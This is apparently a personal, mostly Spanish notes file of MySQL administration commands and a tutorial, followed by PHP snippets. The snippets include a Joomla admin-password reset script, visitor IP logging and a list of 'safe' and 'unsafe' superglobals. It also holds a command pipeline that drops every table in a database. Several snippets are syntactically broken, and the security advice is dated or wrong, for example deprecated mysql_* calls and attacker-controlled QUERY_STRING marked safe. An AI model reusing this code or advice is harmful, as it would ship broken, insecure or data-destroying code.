| 8  | root | localhost |    | Query   | 0    |       | show processlist |
+----+------+-----------+----+---------+------+-------+------------------+

# Entonces ejecutamos el siguiente comando. #

mysqladmin -u root -p kill 5

Enter password:
+----+------+-----------+----+---------+------+-------+------------------+
| Id | User | Host      | db | Command | Time | State | Info             |
+----+------+-----------+----+---------+------+-------+------------------+
| 12 | root | localhost |    | Query   | 0    |       | show processlist |
+----+------+-----------+----+---------+------+-------+------------------+

# Si se necesita matar varios procesos, entonces le pasamos los ID's separados por comas. #

mysqladmin -u root -p kill 5,10


#### Ejecutar varios comandos en una sola linea ####

# Para hacerlo, deberian verse de la siguiente manera. #

mysqladmin  -u root -p processlist status version

Enter password:

+----+------+-----------+----+---------+------+-------+------------------+
| Id | User | Host      | db | Command | Time | State | Info             |
+----+------+-----------+----+---------+------+-------+------------------+
| 8  | root | localhost |    | Query   | 0    |       | show processlist |
+----+------+-----------+----+---------+------+-------+------------------+

Uptime: 3801  Threads: 1  Questions: 15  Slow queries: 0  Opens: 15  Flush tables: 1  Open tables: 8  Queries per second avg: 0.003
mysqladmin  Ver 8.42 Distrib 5.5.28, for Linux on i686
Copyright (c) 2000, 2012, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Server version          5.5.28
Protocol version        10
Connection              Localhost via UNIX socket
UNIX socket             /var/lib/mysql/mysql.sock
Uptime:                 1 hour 3 min 21 sec

Threads: 1  Questions: 15  Slow queries: 0  Opens: 15  Flush tables: 1  Open tables: 8  Queries per second avg: 0.003


#### Conectar a un servidor remoto ####

# Usamos el parametro -h (host) con la direccion IP. #

mysqladmin  -h 172.16.25.126 -u root -p


#### Ejecutar un comando en un servidor remoto ####

# Por ejemplo para ver el estado del mismo. #

mysqladmin  -h 172.16.25.126 -u root -p status


#### Ejecutar un comando en un servidor remoto ####

# Para iniciar o parar una replica, utilizamos los siguientes comandos. #

mysqladmin  -u root -p start-slave

mysqladmin  -u root -p stop-slave


#### Guardar informacion de debug en los logs ####

# Informacion de memoria, entre otros. #

mysqladmin  -u root -p debug

Enter password:


#### Ver y conocer las opciones de uso de mysqladmin ####

# Informacion sobre mysqladmin, parametros extras. #

mysqladmin --help 

#############################################################################################################################################################################################

#### mysql cache

#### ?Como activarla? ?Como aumentar su tamano? ####

# Para ver si esta activada nos dirigimos al fichero my.cnf (que probablemente este en /etc o /etc/mysql) y buscamos dentro las siguientes cadenas: #

query_cache_limit = 16M
query_cache_size = 512M

# Como podeis imaginaros tenemos dos opciones: #

    Que no aparezcan dichas opciones: la cache esta desactivada, podeis agregar dichas lineas sin problema en dicho fichero
    Que aparezcan: ?esta activada? Pero, ?que significan dichas opciones?

# Por partes: #

    query_cache_limit: establece la consulta maxima a cachear, por defecto viene a 1MB, yo trabajo en ocasiones con datos BLOB recurrentes, de ahi que haya puesto un valor exageradamente grande, 16MB.
    query_cache_size: tamano de la cache, si teneis un equipo con varios gigas de RAM, con 512MB tendreis para almacenar muchisimas consultas y 512MB no os supondran gran perdida. De hecho si es un servidor solo con MySQL seria razonable incluir incluso mas cantidad, cada caso es particular y ya sabreis cual es la mejor cifra por vuestra experiencia.

# Una vez hecho eso, solo debemos reiniciar el servicio y si MySQL arranca bien, todo esta hecho, para confirmar, mirad la siguiente entrada para ver estadisticas y mas datos: #

sudo service mysql restart

#############################################################################################################################################################################################

#### mysql insert

This tutorial explains how to use MySQL insert command with several practical and useful examples.

The following example will connect to devdb database with username devuser and password mysecretpwd

# mysql -u devuser -pmysecretpwd devdb
mysql>

For this tutorial, we'll insert values into employee table. This is the structure of the employee table.

mysql> desc employee;
+--------+-------------+------+-----+---------+----------------+
| Field  | Type        | Null | Key | Default | Extra          |
+--------+-------------+------+-----+---------+----------------+
| id     | int(11)     | NO   | PRI | NULL    | auto_increment |
| name   | varchar(20) | YES  |     | NULL    |                |
| dept   | varchar(10) | YES  |     | NULL    |                |
| salary | int(10)     | YES  |     | NULL    |                |
+--------+-------------+------+-----+---------+----------------+


If you are new to MySQL, use this How to create MySQL database and table to get started.

# 1. Basic Insert Command Example #

The following command will insert three new records into employee table. In this example, after the "values", specify the values for all the columns in the table.

INSERT INTO employee VALUES(100,'Thomas','Sales',5000);

Use the MySQL select command to verify that the records got inserted successfully.

SELECT * FROM employee;


# 2. Insert Values only for Selected Columns #

If you want to insert values only to selected columns, you should specify the column names in the insert command.

The following will insert two records only for columns id and name.

INSERT INTO employee(id,name) VALUES(200,'Jason');

For the "dept" and "salary" column, we didn't specify any values for this particular records. So, we'll see NULL as the value in our select command OUTPUT. Please note that this is not the string "NULL", the select command just displays the string "NULL" to indicate that the column value is really null.

mysql> SELECT * FROM employee;
+-----+--------+-------+--------+
| id  | name   | dept  | salary |
+-----+--------+-------+--------+
| 100 | Thomas | Sales |   5000 |
| 200 | Jason  | NULL  |   NULL |
+-----+--------+-------+--------+
2 rows in set (0.00 sec)


# 3. Insert Set Example #

Instead of using "values" keyword in your select command, you can also use "set" keyword in your select command as shown below.

The following insert command is exactly same as the previous example. But, instead of value, this is using set.

mysql> INSERT INTO employee SET id=300, name='Mayla';

mysql> select * from employee;
+-----+--------+-------+--------+
| id  | name   | dept  | salary |
+-----+--------+-------+--------+
| 100 | Thomas | Sales |   5000 |
| 200 | Jason  | NULL  |   NULL |
| 300 | Mayla  | NULL  |   NULL |
+-----+--------+-------+--------+


# 4. Insert Records Based on Rows from Another Table #

In this example, we'll use INSERT ... SELECT method, which will select the rows from another table, and insert it into our table.

The following example will take all the records from contractor table and insert it into employee table.

INSERT INTO employee SELECT * FROM contractor;

You can also use various "where" condition in the select command to only pick selected records from contractor table and insert into employee table as shown below.

INSERT INTO employee SELECT * FROM contractor WHERE salary >= 7000;

Note: If you are used to Oracle database, you'll use "insert into employee AS select * from contractor". Please note that mysql doesn't use the "AS" keywords in this context.


# 5. Insert Selected Columns Values From Another Table #

You can also pick only selected column values of rows from another table and insert it into your table.

The following example will take the values of "id" and "name" for ALL the rows in the contractor table and insert it into employee table.

INSERT INTO employee(id,name) SELECT id,name FROM contractor;

Just like the previous example, you can also use where condition and limit the records.

INSERT INTO employee(id,name) SELECT id,name FROM contractor WHERE salary >= 7000;

Please note that if the record already exist for the primary key (which is id) in the employee table, you'll get the following error message. The following error indicates that the employee id "100? already exists in the employee table.

ERROR 1062 (23000): Duplicate entry '100' for key 'PRIMARY'


# 6. Insert Records to a Specific Partition #

If you have created the table using partition by range, then you can specify the partition in your insert command as shown below.

The following example will insert records into the employee table in partition p1

INSERT INTO employee PARTITION (p1) VALUES(100,'Thomas','Sales',5000);

Please note that the row already exists in that particular partition. For example, in this example p1, you'll get the following error message:

ERROR 1729 (HY000): Found a row not matching the given partition set

Note: This will work only on MySQL 5.6 and above.


# 7. Insert Records to Multiple Partition in a Table #

You can also insert records into multiple partitions using a single insert statement.

The following insert statement will insert the record with id "100? to partition p1, and record with id "200? to partition p2.

INSERT INTO employee PARTITION (p1, p2) VALUES(100,'Thomas','Sales',5000), (200,'Jason','Technology',5500);

Please note that in the above example, if for some reason, MySQL is unable to insert one of the records into a partition, the entire insert statement will fail, and both the records will not be inserted.

Again, this will work only on MySQL 5.6 and above.


# 8. Ignore Error Message During Insert #

For some reason, if you want to ignore the error message thrown by MySQL during insert statement, you can use insert ignore.

For example, the following command will throw an error message, as the record already exists in the table.

mysql> INSERT INTO employee VALUES(100,'Thomas','Sales',5000);
ERROR 1062 (23000): Duplicate entry '100' for key 'PRIMARY'

To ignore the above error message, you can use "insert ignore" (instead of just insert) as shown below. Please note that this will still not insert the record into the table, as there is a primary key on id column. But, this will simply ignore the error message.

mysql> INSERT IGNORE INTO employee VALUES(100,'Thomas','Sales',5000);
Query OK, 0 rows affected (0.00 sec)


# 9. Default Values in Insert #

If the MySQL is running in strict mode, and when we don't specify default values, it will throw error message.

However if strict mode is not enabled (which is default), and when you do an insert command and don't specify a value fora column, it will use the default value for that particular column data types.

For example, in the bonus table, both the column values are set to "not null".

mysql> DESC bonus;
+--------+---------+------+-----+---------+-------+
| Field  | Type    | Null | Key | Default | Extra |
+--------+---------+------+-----+---------+-------+
| id     | int(11) | NO   |     | NULL    |       |
| amount | int(11) | NO   |     | NULL    |       |
+--------+---------+------+-----+---------+-------+

Let us insert a record into this table for id column.

INSERT INTO bonus(id) VALUES(100);

When you do a select command, you'll notice that the amount column is automatically set to implicit default value of 0.

SELECT * FROM bonus;
+-----+--------+
| id  | amount |
+-----+--------+
| 100 |      0 |
+-----+--------+

If you don't specify for both id and amount, both will be set to 0 automatically as shown below. i.e When values are not specified, MySQL will use the DEFAULT values.

INSERT INTO bonus VALUES();

mysql> select * from bonus;
+-----+--------+
| id  | amount |
+-----+--------+
|   0 |      0 |
+-----+--------+

Note: You can also use the keyword "DEFAULT" in the values as shown below, which will achieve the above OUTPUT as above.

INSERT INTO bonus VALUES(DEFAULT,DEFAULT);

For string column, the default value is empty string. Also, please note that when numeric column has AUTO_INCREMENT set, then the default value will be the next value of the appropriate sequence.


# 10. Expression in Insert Values #

In the following example, for the bonus value, we've specified "5000+id" as value. So, this will add the employee id value to the bonus value and insert the final value into the bonus column as shown below.

You can use "+", "-", "*", or any other valid MySQL expression operator in the values. In the following example, it is using "50*2? for id column. So, the id that will be inserted is "100?

You can also refer to the values of other columns. In the following example, it uses "5000+id" for bonus column. So, this will take the value of id column (which is 100), and add it to 5000. So, final bonus value is "5100? as shown below.

mysql> INSERT INTO employee VALUES(50*2,'Thomas','Sales',5000+id);

mysql> select * from employee;
+-----+--------+-------+--------+
| id  | name   | dept  | salary |
+-----+--------+-------+--------+
| 100 | Thomas | Sales |   5100 |
+-----+--------+-------+--------+


# 11. Make Insert a Low Priority (or High Priority) Activity #

For storage engine that supports table locking (for example, MyISAM), you can specify the priority of your insert.

For example, this insert statement will delay the insert (make it low priority) until there are no reads on the table.

INSERT LOW_PRIORITY INTO employee VALUES(100,'Thomas','Sales',5000);

You can also specify high priority as shown below, which will behave opposite to the low priority inserts.

INSERT HIGH_PRIORITY INTO employee VALUES(100,'Thomas','Sales',5000);

Please keep in mind that if your database is read intensive and if you specify a low_priority insert statement, your insert might not go through for a very long time.

Also, please note that this is little different than "INSERT ... DELAYED", which is deprecated starting from MySQL 5.6.6. So, don't use "insert ... delayed" anymore.


# 12. When Duplicate is Found, Update a Column Value #

During insert, if there is a duplicate key, it will fail as shown below, as the id "100? already exist in the table.

mysql>  INSERT INTO employee VALUES(100,'Thomas','Sales',5000);
ERROR 1062 (23000): Duplicate entry '100' for key 'PRIMARY'

mysql> select * from employee;
+-----+--------+-------+--------+
| id  | name   | dept  | salary |
+-----+--------+-------+--------+
| 100 | Thomas | Sales |   5000 |
+-----+--------+-------+--------+

However, you can do some update to that particular record (when a duplicate is found) using the "ON DUPLICATE KEY UPDATE" as shown below.

As shown in the following example, when the insert failed (because of duplicate key), we are updated the salary column by adding 500 to its value.

mysql> INSERT INTO employee VALUES(100,'Thomas','Sales',5000) on DUPLICATE KEY UPDATE salary=salary+500;

mysql> select * from employee;
+-----+--------+-------+--------+
| id  | name   | dept  | salary |
+-----+--------+-------+--------+
| 100 | Thomas | Sales |   5500 |
+-----+--------+-------+--------+

Please note that in the above example, while inserting, even though it updated only one record, the OUTPUT will say "2 rows affected".


#############################################################################################################################################################################################

#### administrar comentarios wordpress ####

Hace algun tiempo atras les mostre como administrar sitios wordpress con comandos, era a traves de un script perl. En este caso les mostrare especificamente como administrar comentarios de un wordpress mediante consultas sql, o sea, mediante comandos en la consola de mysql.

# Lo primero a tener en cuenta es que deben tener acceso a la terminal o consola de MySQL, supongamos que accedemos al servidor por SSH y dentro de el escribimos: #

mysql -u root -p

Esto suponiendo que nuestro usuario de MySQL sea root, si es otro simplemente cambien root por el usuario suyo

Una vez escrito esto y presionado Enter les pedira el password de ese usuario de MySQL, lo escriben, presionan de nuevo Enter y listo, ya habran accedido:

mysql-terminal-acceso


# Una vez dentro del shell de MySQL debemos indicar que base de datos vamos a usar, pueden ver las bases de datos disponibles con: #

show databases;

En MySQL es sumamente importante que terminen siempre las instrucciones con punto y coma ;


# Esto les mostrara como dije las bases de datos disponibles, supongamos que la deseada se llama sitiowordpress, pasemos a usarla: #

use sitiowordpress;


# Revisemos como se llaman las tablas con: #

show tables;

Esto nos dira los nombres de las tablas, sumamente importante pues debemos ver cual es exactamente el nombre de la tabla relacionada con los comentarios: comments

Generalmente se llama wp_comments o de forma similar, lo importante es que siempre termina en: comments


# Eliminar comentarios SPAM #

Con esta linea se borraran todos los comentarios que estan marcados como SPAM:

DELETE from wp_comments WHERE comment_approved = 'spam';

Recuerden, si les dice que la tabla wp_comments no existe entonces deben cambiar wp_comments por el nombre exacto de la tabla de comentarios, nombre que mas arriba despues del show tables; les aparecio


# Eliminar todos los comentarios pendientes de moderacion #

DELETE FROM wp_comments WHERE comment_approved = '0';


# Reemplazar texto en todos los comentarios #

Supongamos que deseamos buscar en todos los comentarios la palabra "politicos" y reemplazarla por "corruptos", seria:

UPDATE wp_comments SET `comment_content` = REPLACE (`comment_content`, 'politicos', 'corruptos');


# Eliminar comentarios segun URL del sitio del autor #

Supongamos que por determinado motivo deseamos eliminar todos los comentarios de cualquier usuario que al comentar, haya especificado en los datos del formulario de comentar (nombre, sitio y correo) que su sitio era http://taringa.com (por citar un ejemplo), seria entonces asi:

DELETE from wp_comments WHERE comment_author_url LIKE 'http://taringa.com';


# Cerrar comentarios en articulos antiguos #

Conozco de personas que desean cerrar los comentarios en posts viejos de sus sitios, entonces deben editar los posts de uno en uno para asi desactivar la opcion de "comentarios habilitados" en cada uno, esta linea les solucionara la vida:

UPDATE wp_posts SET comment_status = 'closed' WHERE post_date < '2010-02-10' AND post_status = 'publish';

Como pueden ver, en la mitad de la linea esta una fecha, 2010-02-10, esto significa que todos los posts que esten publicados y tengan una fecha de publicacion inferior al 10 de febrero de 2010 (o sea, se hayan publicado antes) cerraran los comentarios, ya nadie podra comentar en ellos.


# Cerrar los comentarios en todos los articulos #

En caso de que no deseen cerrar los comentarios solo en algunos posts sino en todos, esta linea les servira:

UPDATE wp_posts SET comment_status = 'closed', ping_status = 'closed' WHERE comment_status = 'open';

Si desean revertir esto, cambien closed por open y viceversa, y listo vuelvan a ejecutar la linea con los cambios.


# Borrar comentarios hechos en determinado rango de tiempo #

Supongamos que deseamos borrar todos los comentarios que se hayan hecho el dia 1ro de abril de 2014, entre 4:15 de la tarde y 10:40 de la noche, la linea seria:

DELETE FROM wp_comments WHERE comment_date > '2014-04-01 16:15:00' AND comment_date <= '2014-04-01 22:40:00';

Como pueden ver la hora es en formato de 24 horas, o sea, hora militar.


Fin!


#############################################################################################################################################################################################

#### Cómo arreglar el error de MySQL: Too Many Connections ####

Cuando se tiene una aplicación web (sitio, blog, foro, etc) que tiene alta demanda, o sea, que gran número de usuarios visita esto se traduce en incremento de consumo en el servidor. Si dicha app web usa una base de datos MySQL y las consultas son realmente muchas (por mala programación de la web o por muchos usuarios usando la web), existe la posibilidad de que MySQL muestre este error:

mysqli_connect(): (HY000/1040): Too many connections
¿qué significa específicamente esto?

Significa que al MySQL están llegando demasiadas peticiones, más de las que puede aceptar, más de las que puede poner en cola o en espera.
¿cómo solucionarlo?

Simple, debemos aumentar el límite máximo de peticiones (conexiones) que MySQL admite.

Les daré dos opciones para solucionar este problema:

1. Editamos el archivo /etc/mysql/my.cfg :

nano /etc/mysql/my.cfg

En él ponemos lo siguiente bajo donde dice [mysql]:

max_connections = 500
max_user_connections = 500

Esto aumentará el número máximo de conexiones de 100 (que es el por defecto) a 500.

Guardamos y salimos, entonces reiniciamos el servicio MySQL y listo. Este cambio es permanente.

2. Otra forma de resolver este problema es cambiando el límite máximo igual, pero mediante una consulta MySQL.

Primero vamos a mostrar el límite actual:

mysql --user="root" --password="PASSWORD" --execute='SHOW VARIABLES LIKE "max_connections";'

Esto nos mostrará algo como esto:

+-----------------+-------+
| Variable_name   | Value |
+-----------------+-------+
| max_connections | 151   |
+-----------------+-------+

O sea, que el límite actual son 151 conexiones, bien, vamos a subirlo a 500 por medio de una consulta:

mysql --user="root" --password="PASSWORD" --execute='SET GLOBAL max_connections = 500;'

Listo!

El problema de esta forma, es que cuando se reinicie el servicio, se pierde esta configuración.

Para suplir este detalle se puede hacer un script bash que cada X tiempo verifique, o inclusive agregar la línea al bloque de start o restart del daemon ;)

¿Pero entonces para qué quiero conocer esta 2da opción? … bueno, eso mismo decía yo. Pero hace un mes un Ubuntu Server hacía caso omiso al método No.1, por lo que… en casos extremos de OS majaderos, tenemos esta 2da opción que funciona igual de bien ;)


#############################################################################################################################################################################################

#### para logearte dentro de una base de datos mysql que se encuentra en un servidor remoto ####

mysql -u usuario -pcontrasena -h ipservidorremoto

#### para logearte dentro de una base de datos mysql en un servidor local o una vez logeado en nuestro servidor ssh ####

mysql -u root -pcontrasena

#### importar una base de datos mysql ####

mysql -u username -ppassword databasename < filename.sql

#### eliminar todas las tablas de una base de datos ####

mysqldump -u username -p --no-data dbname | grep -i ^drop > drop.sql
mysql -u username -p dbname < drop.sql
rm drop.txt

#### comprobar el estado de una base de datos ####

mysqlcheck --check basededatos --user="root" --password="misuperpassword"

#### reparar una base de datos en el caso de que este corrupta ####

repair table public_information;

#### reparar todas las bases de datos que esten corruptas ####

mysqlcheck --defaults-file=/etc/mysql/debian.cnf --auto-repair --all-databases 

#############################################################################################################################################################################################

############################################################################################# php ###########################################################################################

#### php

#### Cuando trabajamos con cadenas con acentos, enes y otros simbolos no compatibles en ciertos entornos, en ocasiones, hemos de sustituirlas por sus equivalentes para poder ofrecer el resultado deseado (por ejemplo, sustituir a por a) ####

#### En PHP este problema es bastante frecuente y encima, se ve agravado porque funciones como strstr tienen problemas cuando trabajamos con codificaciones como UTF-8. Os traigo una funcion que os permitira atajar este problema, os la dejo a continuacion: ####

<?php
function normaliza ($cadena){
$originales = 'AAAAAAAECEEEEIIII?NOOOOO?UUUUY?ssaaaaaaaeceeeeiiii?nooooo?uuuyy?yRr';
$modificadas = 'aaaaaaaceeeeiiiidnoooooouuuuybsaaaaaaaceeeeiiiidnoooooouuuyybyRr';
$cadena = utf8_decode($cadena);
$cadena = strtr($cadena, utf8_decode($originales), $modificadas);
$cadena = strtolower($cadena);
return utf8_encode($cadena);
}
?>

#### Si quereis agregar mas caracteres a convertir, solo teneis que introducirlos al final de los vectores: originales y modificadas; en su misma posicion. ####

#############################################################################################################################################################################################

#### indentificador de llamadas asterix ####

<?php
$numero=$_GET['numero'];

$options = array('http' =>
array( 'header' => 'User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; es-CL; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3' . PHP_EOL )
);
$context = stream_context_create($options);
$cadena = htmlspecialchars(file_get_contents('http://paginasblancas.pe/telefono/'.$numero, false, $context));
//echo $cadena;

$maximo= strlen ($cadena);
$ide="['";
$ide2= "']";
$total= strpos($cadena,$ide);
$total2= strpos($cadena,$ide2);

//echo "Largo de la cadena: $maximo";
//echo "<br>";
//echo "Lo que sobra al inicio: $total";
//echo "<br>";
$total3= ($maximo-$total2-5);
//echo "Lo que sobra al final: $total3";
//echo"<br>";
$final= substr ($cadena,$total,-$total3);
echo "Informacion: $final";


?> 

#############################################################################################################################################################################################

#### resetear password admin joomla ####

<?php


/**********************************************************/
/* Script para resetear password de user admin en joomla  */
/* Subir este archivo por ftp y ejecutarlo                */
/* El nuevo password generado es "test" sin las comillas. */
/* @gabrielreloaded / taringa                             */
/**********************************************************/

// Insertar los datos de tu hosting
$host = "10.10.10.1";
$user = "db_user";
$pass = "db_pass"


$con = mysql_connect($host,$user,$pass);
if (!$con)
{
die('No conecta guacho, alto joomla me hago con 15 peso: ' . mysql_error());
}

mysql_select_db("dbname", $con);

mysql_query("update jos_users SET password='098f6bcd4621d373cade4e832627b4f6' where username='admin'";

?>

#############################################################################################################################################################################################

#### clase en php para conectar con mysql ####

# A medida que utilizamos nuestra base de datos MySQL sobre todo cuando programamos a medida nuestras propias aplicaciones vamos viendo como refinar el codigo y hacerlo mas entendible para futuras mejoras, una forma de organizar un poco el codigo para nuestras conecciones frecuentes es utilizando la programacion orientada a objetos creando una clase propia con un codigo mas transparente sobre todo si nos olvidamos que es lo que hicimos cuando creamos determinado proyecto. #

# Esta class en PHP muestra un uso tipico que hariamos sobre la base de datos: conectar, consultar y cerrar respectivamente #

# Breve explicacion: La funcion conectar recibe la "string connection" con los datos de nuestra base a traves de las variables $dbase,$host,$user,$pass a las cuales le debemos asignar la informacion correspondiente a nuestra base de datos, luego desde nuestro script "llamamos" a la clase para luego pasarle nuestro query o consulta, y finalmente cerramos la base #


#### El codigo: ####

# Esta clase la guardamos en un directorio seguro con el nombre mysql.class.php #

// clase para consultas mysql por http://www.taller-de-scripts.blogspot.com
class DBase {

var $conectar;
var $cerrar;
var $consultar;

function conectar ($dbase='nombre_base_datos',$host='localhost',$user='usuario',$pass='clave'){

$this -> conectar = @mysql_connect($host,$user,$pass);
mysql_select_db($dbase,$this->conectar);
}

function cerrar () {
$this -> cerrar = mysql_close($this -> conectar);

}
function consultar ($sql) {
$this -> consultar = mysql_query($sql);
return ($this -> consultar);
}

}
// Instancia y apertura db
$SQL = new DBase;//instanciar
$SQL -> conectar();
?>


# Luego para usarla desde nuestra aplicacion hacemos lo siguiente: #

nuestro_script.php

require_once ('mysql.class.php');

$query = "
SELECT * FROM mi_tabla
";
// generamos una consulta
$consulta = $SQL -> consultar($query);
$SQL -> cerrar();
?>

#############################################################################################################################################################################################

#### quien visita tu web php ####

# hace unos dias estaba revisando las visitas a mi web desde mi cuentata google analytics, que si bien es muy completo, en cuanto a detalles estadisticos se refiere, tiene una pata floja, al menos para mi, ya que lo que busco es conocer la IP de los visitantes de mi sitio, para que? simple, para tener mayor control del trafico, y esos datos manipularlos a mi antojo ya sea para bans, crear reglas a determinadas ips etc, #

# Trackeando visitas usando fopen + gz + PHPMailer #

# les voy a ensenar como purgar esos logs cuando alcancen una capacidad de 1Mb y al mismo tiempo enviarnos una copia del backup en formato de compresion gz a nuestro email valiendonos de la libreria PHPMailer la cual se readapto para que funcione con PHP 5 o superior. #

# Veamos: #

# Vamos a necesitar 3 archivos para trabajar #

1) visitas.txt (permisos 755, donde vamos a ir guardando a modo de base de datos los logs osea las visitas a la pagina)
2) class.phpmailer.php (la libreria PHPMailer propiamente dicho, para poder enviarnos el archivo comprimido como adjunto)
3) mylog.php (nuestro script php para trackear las visitas)

# Para ser un poco mas prolijos vamos a incorporar con un include('mylog.php'); en la pagina que vamos a trackear #

<?php
error_reporting(0);
require_once('class.phpmailer.php');

function getRealIpAddr() {
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
$ip=$_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
$ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
}else{
$ip=$_SERVER['REMOTE_ADDR'];
}
return $ip;
}



function iComprimir($sFichOrigen, $iNivelComp = 8){

$sFichDetino = $sFichOrigen.".gz";

if ( ! $fOrigen = @fopen($sFichOrigen, "rb" ) )
return false;
$sOriBin = fread( $fOrigen, filesize($sFichOrigen) ) ;
fclose($fOrigen);

$sDesGZ = gzencode( $sOriBin, $iNivelComp ) ;

if ( ! $fDestino = @fopen ($sFichDetino, "wb" ) )
return false;
fwrite($fDestino, $sDesGZ ) ;
fclose($fDestino);

return true;

}

// Genero el log

$NombreArchivo='visitas.txt';

date_default_timezone_set('America/Argentina/Buenos_Aires');//seteo para que me de la fecha de mi pais
$fecha = date("d M Y H:i:s" ) ;
$refer = $_SERVER['HTTP_REFERER'];
$consulta = $_SERVER['QUERY_STRING'];
$browser = $_SERVER['HTTP_USER_AGENT'];
$ruri = $_SERVER['REQUEST_URI'];

$fh=fopen($NombreArchivo,"a+" ) ;// a+ hago un append para no machacar datos
$ip=getRealIpAddr () ;
fputs($fh,"$fecha|$ip|$refer|$consulta|$browser|$rurin" ) ;
fclose( $fh ) ;



// Compruebo el tamano del fichero si es mayor o igual a 1Mb lo comprimo,purgo y lo adjunto por email


$fsize=1048576;// 1 mb expresado en bytes

$k=filesize($NombreArchivo ) ;

if($k>=$fsize){
if (iComprimir ($NombreArchivo, 9))
{
$f=fopen($NombreArchivo,"w" ) ;fclose( $f ) ;//purgo el fichero


// envio por email el log comprimido como adjunto usando la clase PHPMailer



$mail = new PHPMailer(); // defaults to using php "mail()"
$body = "<b>Tu log file!.</b>";
$body = preg_replace("[//]",'',$body ) ;

$mail->AddReplyTo("miremitente@midominio.com","Logs Bck" ) ;
$mail->SetFrom('miremitente@midominio.com', 'Logs Bck' ) ;
$address = "recipiente-donde-mando-el-log@micta.com";
$mail->AddAddress($address, "Tu nombre o pagina" ) ;
$mail->Subject = "Log de tu pagina";
$mail->AltBody = "To view the message, please use an HTML compatible email viewer!"; // optional, comment out and test
$mail->MsgHTML( $body ) ;
$mail->AddAttachment("$NombreArchivo.gz" ) ; // attachment
if(!$mail->Send()) {
//echo "Mailer Error: " . $mail->ErrorInfo;
} else {
//echo "Message sent!";}
$bck = "bck-".date("dMYHis" ) ."txt.gz" ;
rename ("$NombreArchivo.gz",$bck ) ;
}

}

}

?>

#############################################################################################################################################################################################

#### php variables inseguras

# variables superglobales no fiables, donde el cliente puede meter mano: #

#### notas ####

[S]: Seguras
[I]: Inseguras
[D]: Depende...


# $_SERVER: #

PHP_SELF [I]
argv [I]
argc [S]
GATEWAY_INTERFACE [S]
SERVER_ADDR [S]
SERVER_NAME [S]
SERVER_SOFTWARE [S]
SERVER_PROTOCOL [I]
REQUEST_METHOD [I]
REQUEST_TIME [S]
QUERY_STRING [S]: Sin comprobar
DOCUMENT_ROOT [S]
HTTP_ACCEPT [I]
HTTP_ACCEPT* [I]
HTTP_CONNECTION [I]
HTTP_HOST [D]: Inseguro para el host por defecto si hace fallback
HTTP_REFERER [I]
HTTP_USER_AGENT [I]
HTTPS [S]: Sin comprobar
REMOTE_ADDR [S]
REMOTE_HOST [D]: Inseguro si el atacante tiene acceso al servidor DNS
REMOTE_PORT [S]
SCRIPT_FILENAME [S]
SERVER_ADMIN [S]
SERVER_PORT [S]
SERVER_SIGNATURE [S]
PATH_TRANSLATED [I]
SCRIPT_NAME [S]
REQUEST_URI [S]
PHP_AUTH_DIGEST [I]
PHP_AUTH_USER [I]
PHP_AUTH_PW [I]
AUTH_TYPE [I]: No he podido comprobarlo
PATH_INFO [I]
ORIG_PATH_INFO [I]: No he podido comprobarlo

$_GET / $_POST / $_REQUEST / $_COOKIE / $argv / $_HTTP_RAW_POST_DATA [I]

#### notas: $_GET se pasa por urldecode() antes de llegar al script ####

$argc [S]


# $_FILES: #

name [I]
type [I]
tmp_name [S]
error [S]
size [S]


# Como filtrar #

# Si es un entero: #

$clean = intval($dirty);


# Si es un flotante: #

$clean = floatval($dirty);


# Si es una cadena: #

# Antes de meter en la base de datos: #

# http://php.net/manual/en/function.mysql-real-escape-string.php
$clean = mysql_real_escape_string($dirty);

# Antes de mostrar al usuario: #

# http://es.php.net/manual/en/function.htmlentities.php
$clean = html_entities($dirty);

# Alternativamente se puede utilizar una funcion que elimine los caracteres peligrosos ( como base64 ), pero hay que recordar que volveran a ser daninos si se devuelve a la forma original. Asi, una contrasena que se almacene como un hash, una vez se le paso la funcion ( y dado que la forma original se descarta ) es fiable. #

#############################################################################################################################################################################################

#### php tracker bittorent

# Esto lleva un rato sin actualizar, asi que traigo una cosilla que puede resultar interesante, un tracker de BitTorrent que solo ocupa un archivo .php de 250 lineas y que necesita unicamente una tabla en una base de datos MySQL, ademas logicamente del servidor web [ announce.php ] #

# Para montar el tracker hay que subirlo con el nombre announce.php al directorio raiz, de forma que quede algo asi: http://www.miservidor.com/announce.php y modificar estas variables: #

    $dbhost: La direccion del servidor MySQL.
    $dbuser: El usuario del servidor MySQL.
    $dbpass: La contrasena del servidor MySQL.
    $dbname: La base de datos que se utilizara.
    $dbtable: El nombre de la tabla.

# La estructura de la tabla es esta #

 * Columnas:

    Peer_id: char(28)
    info_hash: char(28)
    port: smallint unsigned
    uploaded: int(1)
    downloaded: int(1)
    to_go: int(1)
    ip: varchar(15)
    peer_key: varchar(255)
    completed: boolean
    last_update: int(1)

 * Claves:

    Peer_id
    info_hash

# O directamente: #

create table peers( peer_id char(28), info_hash char(28), port smallint unsigned, uploaded int(1), downloaded int(1), to_go int(1), ip varchar(15), peer_key varchar(255), completed boolean, last_update int(1),KEY (peer_id), KEY (info_hash));


# Otros parametros que pueden ser interesantes: #

    $timeout: Tiempo que se mantendran los datos de los clientes en la base de datos.
    $default_peer_num: Numero de pares que se envian por defecto.
    $max_peer_num: Numero maximo de pares que se envian en cada peticion.
    $interval: Intervalo de segundos entre peticiones del cliente.

# Una cosa, el codigo esta pensado para IPv4, si se envian IP's con el nuevo protocolo pueden pasar cosas extranas, pero no supone un problema de seguridad para el servidor. #

[Referencias]
http://wiki.theory.org/BitTorrent_Tracker_Protocol


#############################################################################################################################################################################################

#### notas: ####

# alternativas a phpmyadmin #

http://www.sqlbuddy.com/

http://www.adminer.org/

#############################################################################################################################################################################################

########################################################################################## wordpress ########################################################################################

#### wordpress





#### notas ####

# el plugin Jetpack es un plugin que tenemos que tener si o si #

########################################################################################### htaccess ########################################################################################

#### htaccess

#### ?Que es el archivo .htaccess? #### 

